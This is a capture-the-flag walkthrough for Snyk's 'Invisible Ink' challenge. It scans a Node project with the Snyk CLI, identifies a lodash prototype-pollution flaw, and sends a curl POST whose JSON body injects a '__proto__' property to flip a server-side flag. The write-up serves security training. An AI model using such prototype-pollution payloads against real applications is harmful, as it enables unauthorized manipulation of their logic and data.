# Invisible Ink

Expose hidden vulnerabilities in the web application.

## Objective

Retrieve a flag through a POST request manipulating the value through a vulnerability

# Resources to install

***Link***: https://ctf-101.snyk.io/challenges#Invisible%20Ink

***Server***: http://35.211.53.53:8000/

Expose hidden vulnerabilities in the web application.

***Hint***: download Snyk CLI scans to the packet.json -> 
https://github.com/snyk/snyk#installation

Install npm if you don't have ii yet:

```
$sudo apt-get install npm
```

Now install snyk CLI:

```
$npm install snyk@latest -g
```

You need to access to snyk before you can run the command to test the package->

```
$snyk auth  (I suggest to access with gitHub)
```

Now you have to install the package

***what is package.json*** -> https://blog.ezekielekunola.com/understanding-the-package.json-file

```
$npm install package.json
```

Run this command into the folder with package.json, where you have just ran the previous command:

```
$snyk monitor
```

This command will show you the current vulnerabilities found.
Possible  response:

Explore this snapshot at https://app.snyk.io/org/emanuelepicas/project/3137722f-04f4-4af7-8a0e-2952b5192a51/history/f2123751-8d69-448f-83d6-87c2d005d96b

Notifications about newly disclosed issues related to these dependencies will be emailed to you.

Click on the link generated here you will find the current Vunerabilities



Browsing into the ***server*** to hack, you will find a response, which will suggest you a request to do.
Below there is the command to run:

```
$curl -X POST 35.211.53.53:8000/echo -H "Content-Type: application/json" -d '{"message": "ping"}' 
```

***Response***

{"userID":"::ffff:82.57.151.149","time":1651490382169,"message":"ping","flag":"disabled"} 

If we take a look at the file index.js, we can see that the script will output the flag if the value of the flag is on true.


We need to manipulate the object to retrive the flag using a vulnerabilities that we can find from the previous command: "snyk monitor"

A good one could be prototype pollution:

https://security.snyk.io/vuln/SNYK-JS-LODASH-567746

This could be a possible solution:

```
$curl -X POST 35.211.53.53:8000/echo -H "Content-Type: application/json" -d '{"message":"ping","__proto__":{"flag":"true"}}'
```

***Response***

{"userID":"::ffff:82.57.151.149","time":1651497940769,"message":"ping","flag":"SNYK{FLAGTOFIND}"} 

# Reference

***understanding prototype*** -> https://www.whitesourcesoftware.com/resources/blog/prototype-pollution-vulnerabilities/
